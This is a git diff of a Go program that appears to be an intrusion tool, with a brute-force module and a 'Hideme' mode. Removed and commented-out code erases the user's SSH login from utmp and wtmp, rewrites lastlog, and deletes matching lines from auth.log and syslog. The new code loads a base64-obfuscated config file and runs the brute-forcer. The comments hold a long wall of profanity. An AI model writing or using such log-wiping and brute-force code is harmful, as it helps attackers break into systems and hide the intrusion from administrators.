@@ -2,21 +2,15 @@ package main
 
 import (
 	"bytes"
+	"encoding/base64"
 	"encoding/binary"
-	"flag"
 	"fmt"
-	"log"
 	"os"
-	"reflect"
-	"slices"
 	"strconv"
 	"strings"
-	authlog "test/AUTHLOG"
 	bf "test/BF"
 	check "test/CHECK"
 	getpty "test/GETPTY"
-	lastlog "test/LASTLOG"
-	utmp "test/UTMP"
 	vars "test/VARS"
 	"time"
 
@@ -69,17 +63,26 @@ import (
 // I have someone thath is looking at it. Somehow seems that it is doing something. I dont know if is a divine power that makes it work or i have made something
 // right for once
 
-var indexToDel int64
-var count int64
+// FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK
+//  FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK
+//  FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK
+//  FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK
+//  FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK
+//  FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK
+//  FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK
+//  FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK
+
+// START ALL OVER AGAINE
+
+// Why i have to delete 2-3 mounths of work. WHY GOD WHY?
+
 var ProxyIp [16]byte
-var play bool = true // TODO delete
+
 var conf vars.Config
 
 func init() {
+	ReadTomlFile()
 
-	if _, err := toml.DecodeFile("config.toml", &conf); err != nil {
-		log.Fatal(err)
-	}
 	if false { //<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<,//TODO Remove False
 		os.Remove("config.toml")
 	}
@@ -92,33 +95,30 @@ func init() {
 func main() {
 	// history.DelHistory()
 
-	connectedData, _ := getpty.GetConectedData()
-	fmt.Println("APP", connectedData.AppPTY, "SSH", connectedData.SSHPTY, "USer", connectedData.User, "SSH TIME : ", connectedData.TimeLoginSSH, "AppTime", connectedData.TimeProgrammStart, "SSH PID : ", connectedData.SSHPID, "FirstSpown ID :", connectedData.FirstSpownID)
-	// time.Sleep(30 * time.Second)
-
-	if true {
+	getpty.GetConectedData()
+	fmt.Println(conf.Flags.PidToStart, "SOSTOOOOOOOOOOOOOOOOOOOOOOOO", conf)
+	// fmt.Println("APP", connectedData.AppPTY, "SSH", connectedData.SSHPTY, "USer", connectedData.User, "SSH TIME : ", connectedData.TimeLoginSSH, "AppTime", connectedData.TimeProgrammStart, "SSH PID : ", connectedData.SSHPID, "FirstSpown ID :", connectedData.FirstSpownID)
+	if false {
 		if conf.Flags.Hideme {
 
 			euid := os.Geteuid()
 			if euid == 0 {
 				// connectedUser := flag.String("u", "ubuntu", "Connected User")
-				flag.Parse()
-				myepoch, err := utmp.ParceUtmpFileToGetEpoch(connectedData)
+				// flag.Parse()
+				// myepoch, err := utmp.ParceUtmpFileToGetEpoch(connectedData)
 
-				check.Check("Error On parshing UTMP file for EPOCH", err)
-				connectedData.TimeLoginSSHEpoch = myepoch
-				sessNum, err := utmp.GetSessionId(connectedData.TimeLoginSSHEpoch)
-				check.Check("error On Getting Session Number", err)
-				utmp.ClearUTMP(connectedData)
-				time.Sleep(2 * time.Second)
-				dataToInfl, _ := parceDataWtmpFile(connectedData)
+				// check.Check("Error On parshing UTMP file for EPOCH", err)
+				// connectedData.TimeLoginSSHEpoch = myepoch
+				// sessNum, err := utmp.GetSessionId(connectedData.TimeLoginSSHEpoch)
+				// check.Check("error On Getting Session Number", err)
+				// utmp.ClearUTMP(connectedData)
+				// time.Sleep(2 * time.Second)
+				// dataToInfl, _ := parceDataWtmpFile(connectedData)
 
-				dataToInfl.ConData = connectedData
-				dataToInfl.ConData.SessionNumber = sessNum
+				// dataToInfl.ConData = connectedData
+				// dataToInfl.ConData.SessionNumber = sessNum
 
-				// ConvertIPToBytearray(&connectedData.IP)
-
-				lastlog.ChangeLastLog(&connectedData.IP, &dataToInfl, &conf.Flags.ConnectedUser)
+				// lastlog.ChangeLastLog(&connectedData.IP, &dataToInfl, &conf.Flags.ConnectedUser)
 				// /////////////////////////////////////////////////////////////////////////////
 				// sessionStart := int(dataToInfl.Time.Sec)
 				// sessionStop := int(dataToInfl.TimeEnd.Sec)
@@ -127,25 +127,45 @@ func main() {
 
 				// fmt.Println(sessionStart, sessionStop, connectedData.TimeLoginSSH, "AAAAAAAAAAAAAAAAAAAAASSSSSSSSSSSSS~~~~~~~~~~~~~~")
 
-				err = authlog.DeleteLineAuthLogAndSyslog(vars.AUTH_LOG, dataToInfl) //
-				if err != nil {
-					fmt.Println(err)
-				}
-				err = authlog.DeleteLineAuthLogAndSyslog(vars.SYSLOG, dataToInfl) //
-				if err != nil {
-					fmt.Println(err)
-				} //
+				// TODO delete previous  DONT DELETE THE FOLLOWING
+				fmt.Println("HERE")
+				time.Sleep(10 * time.Second)
+				// ConvertIPToBytearray(&connectedData.IP)
+				// err := authlog.DeleteLineAuthLogAndSyslog(vars.AUTH_LOG, connectedData) //
+				// if err != nil {
+				// 	fmt.Println(err)
+				// }
+				// err = authlog.DeleteLineAuthLogAndSyslog(vars.SYSLOG, connectedData) //
+				// if err != nil {
+				// 	fmt.Println(err)
+				// } //
 
 			}
 		}
 
-		// if false {
-		bf.Bf(conf) //
-		// }
+		if true { //TODO REMOVE false
+			bf.Bf(conf) //
+		}
 	}
 
 	// time.Sleep(15 * time.Second) //
 
+}
+
+func ReadTomlFile() {
+	x := check.OpenAndReadFiles("config.toml")
+	decodedToml, err := base64.StdEncoding.DecodeString(string(x))
+	if err != nil {
+		fmt.Println("Error decoding base64 TOML:", err)
+		return
+	}
+
+	var conf vars.Config
+
+	// Use bytes.NewReader to pass the decoded string as a reader
+	reader := bytes.NewReader(decodedToml)
+	z := toml.NewDecoder(reader)
+	z.Decode(&conf)
 }
 
 func ConvertIPToBytearray(ip *string) { //
@@ -172,117 +192,117 @@ func ConvertIPToBytearray(ip *string) { //
 
 // This fuck checks the WTMP file
 // WTMP holds the last data
-func parceDataWtmpFile(connectedUser vars.ConnectedData) (vars.DataToInfl, error) {
+// func parceDataWtmpFile(connectedUser vars.ConnectedData) (vars.DataToInfl, error) {
 
-	count = 0
-	file, err := os.Open(vars.WTMP)
-	if err != nil {
-		fmt.Printf("Error opening utmp file: %v\n", err)
-		return vars.DataToInfl{}, err
-	}
-	defer file.Close()
+// 	count = 0
+// 	file, err := os.Open(vars.WTMP)
+// 	if err != nil {
+// 		fmt.Printf("Error opening utmp file: %v\n", err)
+// 		return vars.DataToInfl{}, err
+// 	}
+// 	defer file.Close()
 
-	DtIN := []vars.DataToInfl{}
-	for {
+// 	DtIN := []vars.DataToInfl{}
+// 	for {
 
-		var record vars.Utmp
-		err := binary.Read(file, binary.LittleEndian, &record)
-		if err != nil {
-			break
-		}
+// 		var record vars.Utmp
+// 		err := binary.Read(file, binary.LittleEndian, &record)
+// 		if err != nil {
+// 			break
+// 		}
 
-		name := ""
+// 		name := ""
 
-		for _, j := range record.User[:] {
-			if j > 0 {
-				name = name + string(j)
-			}
-		}
-		// bs, err := hex.DecodeString(record.Device)
-		if name == connectedUser.User && record.Type == 0x7 { //&& connectedUser.SSHPTY == strings.TrimRight(string(record.Device[:]), "\x00") {
+// 		for _, j := range record.User[:] {
+// 			if j > 0 {
+// 				name = name + string(j)
+// 			}
+// 		}
+// 		// bs, err := hex.DecodeString(record.Device)
+// 		if name == connectedUser.User && record.Type == 0x7 { //&& connectedUser.SSHPTY == strings.TrimRight(string(record.Device[:]), "\x00") {
 
-			DtIN = append(DtIN, vars.DataToInfl{User: string(record.User[:]),
-				Pid: record.Pid,
-				Time: vars.TimeVal{
-					Sec:  record.Time.Sec,
-					Usec: record.Time.Usec},
-				TimeEnd: vars.TimeVal{},
-				AddrV6:  record.AddrV6,
-				Device:  record.Device})
-			indexToDel = count
-			// fmt.Println(DtIN)
+// 			DtIN = append(DtIN, vars.DataToInfl{User: string(record.User[:]),
+// 				Pid: record.Pid,
+// 				Time: vars.TimeVal{
+// 					Sec:  record.Time.Sec,
+// 					Usec: record.Time.Usec},
+// 				TimeEnd: vars.TimeVal{},
+// 				AddrV6:  record.AddrV6,
+// 				Device:  record.Device})
+// 			indexToDel = count
+// 			// fmt.Println(DtIN)
 
-		} else if record.Type == 0x8 {
-			for i, j := range DtIN {
-				// fmt.Println(j.Pid, record.Pid, j.Device, record.Device, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAASSSSSSSSSSSSSSSSSSSSSSSS")
-				if j.Pid == record.Pid && reflect.DeepEqual(j.Device, record.Device) {
-					DtIN[i].TimeEnd.Sec = record.Time.Sec
-					DtIN[i].TimeEnd.Usec = record.Time.Usec
-				}
-			}
-		}
-		count += 1
-	}
+// 		} else if record.Type == 0x8 {
+// 			for i, j := range DtIN {
+// 				// fmt.Println(j.Pid, record.Pid, j.Device, record.Device, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAASSSSSSSSSSSSSSSSSSSSSSSS")
+// 				if j.Pid == record.Pid && reflect.DeepEqual(j.Device, record.Device) {
+// 					DtIN[i].TimeEnd.Sec = record.Time.Sec
+// 					DtIN[i].TimeEnd.Usec = record.Time.Usec
+// 				}
+// 			}
+// 		}
+// 		count += 1
+// 	}
 
-	//////////////////////////////////////////////////////////////////////////////
+// 	//////////////////////////////////////////////////////////////////////////////
 
-	err = deleteBytesFromFile(vars.WTMP, indexToDel*384, 384)
-	if err != nil {
-		fmt.Println(err)
-	}
-	//////////////////////////////////////////////////////////////////////////////
-	slices.Reverse(DtIN)
-	if len(DtIN) > 1 {
-		DtIN = DtIN[1:]
-		dess := vars.Dessisions{}
-		for i, d := range DtIN {
-			if connectedUser.User == strings.TrimRight(d.User, "\x00") && strings.Contains(strings.TrimRight(string(d.Device[:]), "\x00"), "pts") {
-				dess.Dessision = append(dess.Dessision, i)
-			}
-		}
-		finalDtI := vars.DataToInfl{}
+// 	err = deleteBytesFromFile(vars.WTMP, indexToDel*384, 384)
+// 	if err != nil {
+// 		fmt.Println(err)
+// 	}
+// 	//////////////////////////////////////////////////////////////////////////////
+// 	slices.Reverse(DtIN)
+// 	if len(DtIN) > 1 {
+// 		DtIN = DtIN[1:]
+// 		dess := vars.Dessisions{}
+// 		for i, d := range DtIN {
+// 			if connectedUser.User == strings.TrimRight(d.User, "\x00") && strings.Contains(strings.TrimRight(string(d.Device[:]), "\x00"), "pts") {
+// 				dess.Dessision = append(dess.Dessision, i)
+// 			}
+// 		}
+// 		finalDtI := vars.DataToInfl{}
 
-		if len(dess.Dessision) > 0 {
-			finalDtI = DtIN[dess.Dessision[0]]
-			finalDtI.ConData = connectedUser
-		}
-		return finalDtI, nil
-	} else {
-		fmt.Println("PRINT THEM")
-		// time.Sleep(60 * time.Second)
-		return vars.DataToInfl{}, nil
+// 		if len(dess.Dessision) > 0 {
+// 			finalDtI = DtIN[dess.Dessision[0]]
+// 			finalDtI.ConData = connectedUser
+// 		}
+// 		return finalDtI, nil
+// 	} else {
+// 		fmt.Println("PRINT THEM")
+// 		// time.Sleep(60 * time.Second)
+// 		return vars.DataToInfl{}, nil
 
-	}
+// 	}
 
-}
+// }
 
-func deleteBytesFromFile(filePath string, start int64, count int64) error { //wtmp 24*384 384
-	// Read the file contents
-	data, err := os.ReadFile(filePath)
-	if err != nil {
-		return err
-	}
+// func deleteBytesFromFile(filePath string, start int64, count int64) error { //wtmp 24*384 384
+// 	// Read the file contents
+// 	data, err := os.ReadFile(filePath)
+// 	if err != nil {
+// 		return err
+// 	}
 
-	// Check if the range to delete is valid
-	fileSize := int64(len(data))
-	if start < 0 || start >= fileSize || start+count > fileSize {
-		return fmt.Errorf("invalid range")
-	}
+// 	// Check if the range to delete is valid
+// 	fileSize := int64(len(data))
+// 	if start < 0 || start >= fileSize || start+count > fileSize {
+// 		return fmt.Errorf("invalid range")
+// 	}
 
-	// Remove the bytes from the slice
-	copy(data[start:], data[start+count:])
+// 	// Remove the bytes from the slice
+// 	copy(data[start:], data[start+count:])
 
-	// Truncate the file
-	err = os.Truncate(filePath, fileSize-count)
-	if err != nil {
-		return err
-	}
+// 	// Truncate the file
+// 	err = os.Truncate(filePath, fileSize-count)
+// 	if err != nil {
+// 		return err
+// 	}
 
-	// Write the modified data back to the file
-	err = os.WriteFile(filePath, data[:fileSize-count], 0644)
-	if err != nil {
-		return err
-	}
+// 	// Write the modified data back to the file
+// 	err = os.WriteFile(filePath, data[:fileSize-count], 0644)
+// 	if err != nil {
+// 		return err
+// 	}
 
-	return nil
-}
+// 	return nil
+// }
